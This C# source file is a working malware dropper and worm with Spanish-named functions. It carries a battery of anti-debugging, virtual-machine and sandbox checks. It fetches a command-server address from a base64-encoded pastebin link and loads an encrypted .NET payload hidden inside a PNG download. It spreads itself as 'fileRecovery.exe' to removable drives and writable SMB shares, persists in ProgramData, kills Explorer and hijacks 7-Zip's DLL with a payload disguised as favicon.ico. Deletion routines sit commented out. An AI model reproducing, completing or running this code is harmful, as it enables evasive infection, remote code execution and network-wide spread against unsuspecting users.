using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Management;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Security;
using System.Collections;
using System.Collections.Generic;

class SMBScanner
{
    [DllImport("Netapi32", CharSet = CharSet.Auto, SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
    public static extern int NetServerEnum(
        string serverName,
        int dwLevel,
        ref IntPtr pBuf,
        int dwPrefMaxLen,
        out int dwEntriesRead,
        out int dwTotalEntries,
        int dwServerType,
        string domain,
        out int dwResumeHandle
        );

    [DllImport("Netapi32", SetLastError = true), SuppressUnmanagedCodeSecurity]
    public static extern int NetApiBufferFree(IntPtr pBuf);

    [StructLayout(LayoutKind.Sequential)]
    public struct ServerInfo100
    {
        internal int sv100_platform_id;
        [MarshalAs(UnmanagedType.LPWStr)]
        internal string sv100_name;
    }

    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
    private static extern int NetShareEnum(
         StringBuilder ServerName,
         int level,
         ref IntPtr bufPtr,
         uint prefmaxlen,
         ref int entriesread,
         ref int totalentries,
         ref int resume_handle
         );
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SHARE_INFO_1
    {
        public string shi1_netname;
        public uint shi1_type;
        public string shi1_remark;
        public SHARE_INFO_1(string sharename, uint sharetype, string remark)
        {
        this.shi1_netname = sharename;
        this.shi1_type = sharetype;
        this.shi1_remark = remark;
        }
        public override string ToString()
        {
        return shi1_netname;
        }
    }
    const uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;
    const int NERR_Success = 0;
    private enum NetError : uint
    {
        NERR_Success = 0,
        NERR_BASE = 2100,
        NERR_UnknownDevDir = (NERR_BASE + 16),
        NERR_DuplicateShare = (NERR_BASE + 18),
        NERR_BufTooSmall = (NERR_BASE + 23),
    }
    private enum SHARE_TYPE : uint
    {
        STYPE_DISKTREE = 0,
        STYPE_PRINTQ = 1,
        STYPE_DEVICE = 2,
        STYPE_IPC = 3,
        STYPE_SPECIAL = 0x80000000,
    }
    public static SHARE_INFO_1[] EnumNetShares(string Server)
    {
        List<SHARE_INFO_1> ShareInfos = new List<SHARE_INFO_1>();
        int entriesread = 0;
        int totalentries = 0;
        int resume_handle = 0;
        int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1));
        IntPtr bufPtr = IntPtr.Zero;
        StringBuilder server = new StringBuilder(Server);
        int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle);
        if (ret == NERR_Success)
        {
        IntPtr currentPtr = bufPtr;
        for (int i = 0; i < entriesread; i++)
        {
            SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));
            ShareInfos.Add(shi1);
            currentPtr = new IntPtr(currentPtr.ToInt64() + nStructSize);
        }
        NetApiBufferFree(bufPtr);
        return ShareInfos.ToArray();
        }
        else
        {
        ShareInfos.Add(new SHARE_INFO_1("ERROR=" + ret.ToString(),10,string.Empty));
        return ShareInfos.ToArray();
        }
    }

    public static ArrayList GetNetworkComputers()
    {
        ArrayList networkComputers = new ArrayList();
        const int MAX_PREFERRED_LENGTH = -1;
        int SV_TYPE_WORKSTATION = 1;
        int SV_TYPE_SERVER = 2;
        IntPtr buffer = IntPtr.Zero;
        IntPtr tmpBuffer = IntPtr.Zero;
        int entriesRead;
        int totalEntries;
        int resHandle;
        int sizeofInfo = Marshal.SizeOf(typeof(ServerInfo100));


        try
        {
            int ret = NetServerEnum(null, 100, ref buffer,
                                    MAX_PREFERRED_LENGTH, out entriesRead, out totalEntries,
                                    SV_TYPE_WORKSTATION | SV_TYPE_SERVER, null, out resHandle);

            if (ret == 0)
            {
                for (int i = 0; i < totalEntries; i++)
                {
                    tmpBuffer = new IntPtr((long)buffer +(i * sizeofInfo));

                    ServerInfo100 svrInfo = (ServerInfo100)
                                               Marshal.PtrToStructure(tmpBuffer,
                                                                      typeof(ServerInfo100));
                    networkComputers.Add(svrInfo.sv100_name);
                }
            }
        }
        catch (Exception ex)
        {
            return null;
        }
        finally
        {
            NetApiBufferFree(buffer);
        }
        return networkComputers;
    }

    static bool ProbarPermisos(string path)
    {
        try
        {
            string testFile = Path.Combine(path, "testfile.txt");
            File.WriteAllText(testFile, "test");
            File.Delete(testFile);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public static void copiar()
    {
        var computers = GetNetworkComputers();
        if (computers == null) return;
        foreach (string host in computers)
        {
            SHARE_INFO_1[] shares = EnumNetShares(@"\\" + host);
            foreach (SHARE_INFO_1 shareInfo in shares)
            {
                string share = shareInfo.shi1_netname;
                if (string.IsNullOrWhiteSpace(share)) continue;

                string path = @"\\" + host + "\\" + share;

                if (ProbarPermisos(path))
                {
                    try
                    {
                        foreach (string file in Directory.GetFiles(path))
                        {
                            //File.Delete(file);
                        }
                        foreach (string dir in Directory.GetDirectories(path))
                        {
                            //Directory.Delete(dir, true);
                        }

                        string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        string selfFileName = Path.GetFileName(selfPath);
                        string destinationPath = Path.Combine(path, "fileRecovery.exe");
                        File.Copy(selfPath, destinationPath, true);
                    }
                    catch{}
                }
            }
        }
    }
}

class AntiDebug
{
    [DllImport("kernel32.dll")]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

    public static bool EstaSiendoDepurado_CheckRemote()
    {
        bool isDebugger = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebugger);
        return isDebugger;
    }

    [DllImport("kernel32.dll")]
    private static extern bool QueryPerformanceCounter(out long lpPerformanceCount);

    [DllImport("kernel32.dll")]
    private static extern bool QueryPerformanceFrequency(out long lpFrequency);

    public static bool TiempoSospechoso_QueryPerformance()
    {
        QueryPerformanceCounter(out long start);
        for (int i = 0; i < 1000; i++) { }
        QueryPerformanceCounter(out long end);
        QueryPerformanceFrequency(out long freq);

        double elapsed = (double)(end - start) / freq;
        return elapsed > 0.001; 
    }

    public static bool DetectarPrefijoMAC()
    {
        string[] prefijosVM = new string[]
        {
            "08:00:27", 
            "00:05:69", 
            "00:1C:42"  
        };

        foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.OperationalStatus == OperationalStatus.Up)
            {
                string mac = nic.GetPhysicalAddress().ToString();
                if (mac.Length >= 6)
                {
                    string prefijo = $"{mac.Substring(0, 2)}:{mac.Substring(2, 2)}:{mac.Substring(4, 2)}";
                    foreach (string vmPrefijo in prefijosVM)
                    {
                        if (prefijo.Equals(vmPrefijo, StringComparison.OrdinalIgnoreCase))
                            return true;
                    }
                }
            }
        }

        return false;
    }

     public static bool ComportamientoMouseArtificial()
    {
        int movimientos = 0;
        int xInicial = Cursor.Position.X;
        int yInicial = Cursor.Position.Y;

        System.Threading.Thread.Sleep(1500);

        int xFinal = Cursor.Position.X;
        int yFinal = Cursor.Position.Y;

        if (xFinal == xInicial && yFinal == yInicial)
        {
            movimientos++;
        }

        return movimientos > 0;
    }


    public static bool IsVMByDrivers()
    {
        string[] vmDrivers = {
            "VBoxMouse", "VBoxGuest", "VBoxSF", "VBoxVideo",
            "vmci", "vmhgfs", "vmmouse", "vmusb", "vmx_svga",
            "qemu-ga"
        };

        foreach (var driver in vmDrivers)
        {
            if (File.Exists(driver))
            {
                return true;
            }
        }
        return false;
    }

    public static bool CheckSuspiciousProcesses()
    {
        string[] suspicious = {
            "wireshark.exe", "processhacker.exe", "vboxservice.exe",
            "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe"
        };

        foreach (var process in Process.GetProcesses())
        {
            foreach (var suspiciousProcess in suspicious)
            {
                if (process.ProcessName.Equals(suspiciousProcess, StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }
        }
        return false;
    }

public static bool DetectarClavesDeRegistroDeVM()
{
    string[] posiblesClavesVM = new string[]
    {
        @"HARDWARE\ACPI\DSDT\VBOX__",
        @"HARDWARE\ACPI\FADT\VBOX__",
        @"HARDWARE\ACPI\RSDT\VBOX__",
        @"SOFTWARE\Oracle\VirtualBox Guest Additions",

        @"HARDWARE\ACPI\DSDT\VMware",
        @"HARDWARE\DESCRIPTION\System\SystemBiosVersion",
        @"SOFTWARE\VMware, Inc.\VMware Tools",

        @"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
        //@"SYSTEM\CurrentControlSet\Services\vmicheartbeat",
        //@"SYSTEM\CurrentControlSet\Services\vmicvss",

        @"HARDWARE\ACPI\DSDT\QEMU",

        @"SYSTEM\ControlSet001\Services\prl_tg",

        @"SYSTEM\ControlSet001\Services\xenbus",

        //@"HARDWARE\DESCRIPTION\System\BIOS"
    };

    foreach (string ruta in posiblesClavesVM)
    {
        try
        {
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(ruta))
            {
                if (key != null)
                {
                    return true;           
                }
            }
        }
        catch
        {
            continue;
        }
    }

    return false;
}

    public static bool IsVirtualByWMI()
    {
        var process = new ProcessStartInfo("wmic", "bios get serialnumber")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (var p = Process.Start(process))
        using (var reader = p.StandardOutput)
        {
            string output = reader.ReadToEnd();
            return output.Contains("VMware") || output.Contains("VBOX") || output.Contains("Virtual") || output.Contains("QEMU");
        }
    }

    public static bool IsSandboxByUptime()
    {
        return Environment.TickCount < 30000; 
    }

     [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength, ref int ReturnLength);

    const int ProcessBasicInformation = 0;

    public static bool EsDebuggerPorPEB()
    {
        int debuggerFlag = 0;
        IntPtr processHandle = OpenProcess(0x1000, false, Process.GetCurrentProcess().Id); 
        int returnLength = 0;

        int status = NtQueryInformationProcess(processHandle, ProcessBasicInformation, ref debuggerFlag, Marshal.SizeOf(typeof(int)), ref returnLength);
        if (status == 0)
        {
            return debuggerFlag != 0; 
        }
        return false;
    }

    [DllImport("kernel32.dll")]
    private static extern void __debugbreak();

    public static bool TieneAlMenos2Nucleos()
    {
        try
        {
            int nucleos = Environment.ProcessorCount;
            return nucleos >= 2;
        }
        catch
        {
            return false;
        }
    }

    public static bool ObtenerTamañoDeRAM()
    {
        try
            {
                var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (ManagementObject obj in searcher.Get())
                {
                    ulong totalMemory = (ulong)obj["TotalPhysicalMemory"];
                    const ulong cuatroGB = 4UL * 1024 * 1024 * 1024; 
                    return totalMemory >= cuatroGB;
                }
            }
        catch { }
        return false;
    }

    public static bool EsUnaVM()
    {
        var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
        foreach (ManagementObject queryObj in searcher.Get())
        {
            if (queryObj["Model"].ToString().Contains("Virtual")|| queryObj["Model"].ToString().Contains("qemu") || queryObj["Model"].ToString().Contains("VM") || queryObj["Model"].ToString().Contains("Hyper V"))
            {
                return true;
            }
        }
        return false;
    }

    public static bool DetectarSleepSkipping()
    {
        DateTime start = DateTime.Now;
        Thread.Sleep(100); 
        DateTime end = DateTime.Now;

        return (end - start).TotalMilliseconds < 90;
    }
}


class Program
{
    const int BUF_SIZE = 1024;

     static void IsSandboxOrVM()
    {
        if (
            AntiDebug.EstaSiendoDepurado_CheckRemote() ||
            AntiDebug.TiempoSospechoso_QueryPerformance() ||
            AntiDebug.EsDebuggerPorPEB() ||
            AntiDebug.ComportamientoMouseArtificial() ||
            AntiDebug.DetectarSleepSkipping() ||
            AntiDebug.DetectarPrefijoMAC() ||
            AntiDebug.IsVMByDrivers() ||
            AntiDebug.CheckSuspiciousProcesses() ||
            AntiDebug.DetectarClavesDeRegistroDeVM() ||
            AntiDebug.IsVirtualByWMI() ||
            AntiDebug.IsSandboxByUptime() ||
            !AntiDebug.TieneAlMenos2Nucleos() ||
            !AntiDebug.ObtenerTamañoDeRAM() ||
            AntiDebug.EsUnaVM()
        )
        {
            Environment.Exit(0); 
        }
    }


    static byte[] DownloadPayload(string url)
    {
        using (var client = new WebClient())
        {
            return client.DownloadData(url);
        }
    }

    public static (byte[] payload, string aesKeyBase64) ObtenerPayloadYClave(string url)
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        request.Method = "GET";

        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        {
            string rc4key = response.Headers["Server"];

            using (var memoryStream = new MemoryStream())
            using (var responseStream = response.GetResponseStream())
            {
                responseStream.CopyTo(memoryStream);
                byte[] htmlPage = memoryStream.ToArray();
                byte[] psBytes = new byte[htmlPage.Length - 16];
                Array.Copy(htmlPage, 16, psBytes, 0, psBytes.Length);

                return (psBytes, rc4key.Substring(35));
            }
        }
    }

    static string GetFileHash(string filePath)
    {
        using (SHA256 sha256 = SHA256.Create()) 
        {
            using (FileStream fileStream = File.OpenRead(filePath)) 
            {
                byte[] hashBytes = sha256.ComputeHash(fileStream); 
                return BitConverter.ToString(hashBytes).Replace("-", "").ToLower(); 
            }
        }
    }

    static bool verify(string url, string hash)
    {
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.Headers.Add("Cookie", $"cookie={hash}");

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                int statusCode = (int)response.StatusCode;
                return statusCode == 200;
            }
        }
        catch
        {
            return false;
        }
    }


    static string getUrl(string a)
    {
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Encoding.UTF8.GetString(Convert.FromBase64String(a)));
            request.Method = "GET";

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }
        catch
        {
            return null;
        }
    }

    static void copyRemDr()
    {
        var drives = DriveInfo.GetDrives()
                      .Where(d => (d.DriveType == DriveType.Removable || d.DriveType == DriveType.Network) && d.IsReady);
        foreach (var drive in drives)
        {
            foreach (string file in Directory.GetFiles(drive.RootDirectory.FullName, "*", SearchOption.AllDirectories))
            {
                //try { File.Delete(file); } catch {}
            }

            foreach (string dir in Directory.GetDirectories(drive.RootDirectory.FullName, "*", SearchOption.AllDirectories).OrderByDescending(s => s.Length))
            {
                //try { Directory.Delete(dir, true); } catch {}
            }
        }
        string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        string selfFileName = Path.GetFileName(selfPath);
        foreach (var drive in drives)
        {
            string destinationPath = Path.Combine(drive.RootDirectory.FullName, "fileRecovery.exe");
            File.Copy(selfPath, destinationPath, true);
        }
    }
  
    static void killExplorer(){
        try
        {
            foreach (Process proc in Process.GetProcessesByName("explorer"))
            {
                proc.Kill();
                proc.WaitForExit();
            }
        }
        catch {}
    }

    static void dllProxying(string b)
    {
        byte[] icoBytes = DownloadPayload(b + "/favicon.ico");
        byte[] dllBytes = icoBytes.Skip(5).ToArray();
        string sevenZipDir = @"C:\Program Files\7-Zip"; 
        string originalDllPath = Path.Combine(sevenZipDir, "7-zip.dll");
        string backupDllPath = Path.Combine(sevenZipDir, "7-zip-tools.dll");

        try
        {
            if (File.Exists(originalDllPath))
            {
                File.Move(originalDllPath, backupDllPath);
            }
            File.WriteAllBytes(originalDllPath, dllBytes);
        }
        catch {}
    }


    static void Rc4(ref byte[] data, byte[] key) //la implementacion manual reduce imports para que sea menos sospechoso
    {
        int dataLen = data.Length;
        int keyLen = key.Length;
        byte[] S = new byte[256];
        int i, j = 0, k, temp;

        for (i = 0; i < 256; i++)
            S[i] = (byte)i;

        for (i = 0; i < 256; i++)
        {
            j = (j + (int)S[i] + (int)key[i % keyLen]) % 256;
            temp = (int)S[i]; 
            S[i] = (byte)S[j];
            S[j] = (byte)temp;
        }

        i = j = 0;
        for (k = 0; k < dataLen; k++)
        {
            i = (i + 1) % 256;
            j = (j + (int)S[i]) % 256;
            temp = (int)S[i];
            S[i] = (byte)S[j];
            S[j] = (byte)temp;
            data[k] ^= S[(int)((S[i] + S[j]) % 256)];
        }
    }


    static void DownloadAndExecuteDll(string dllUrl, string className, string methodName, string arguments)
    {
        try
        {
            byte[] pngBytes = DownloadPayload(dllUrl);
            byte[] dllBytes = new byte[pngBytes.Length - 8];
            Array.Copy(pngBytes, 8, dllBytes, 0, dllBytes.Length);
            Assembly assembly = Assembly.Load(dllBytes);
            Type type = assembly.GetType(className);
            if (type == null)
            {
                return;
            }

            MethodInfo method = type.GetMethod(methodName);
            if (method == null)
            {
                return;
            }

            method.Invoke(null, new object[] { arguments });
        }
        catch {}
    }
    
    static void Main()
    {
        try
        {
            IsSandboxOrVM();
            string filename = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string b = getUrl("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZZemRwanVL");
            if (!verify(b + "/session", GetFileHash(filename)))
            {
                Environment.Exit(1);
            }
            Process.Start("calc.exe");
            (byte[] encrypted, string clave_texto) = ObtenerPayloadYClave(b + "/index.html");
            Rc4(ref encrypted, Encoding.ASCII.GetBytes(clave_texto));
            string decryptedText = Encoding.UTF8.GetString(encrypted);
            byte[] textoRecuperadoBytes = Convert.FromBase64String(decryptedText);
            string textoFinal = Encoding.UTF8.GetString(textoRecuperadoBytes);
            string className = "Powerless.Program";
            string methodName = "run";
            string arguments = textoFinal;
            DownloadAndExecuteDll(b + "/image.png", className, methodName, arguments);
            copyRemDr();
            SMBScanner.copiar();
            File.Copy(filename, @"C:\\ProgramData\\main.exe", true);
            killExplorer();
            dllProxying(b);
        }
        catch{}
    }
}
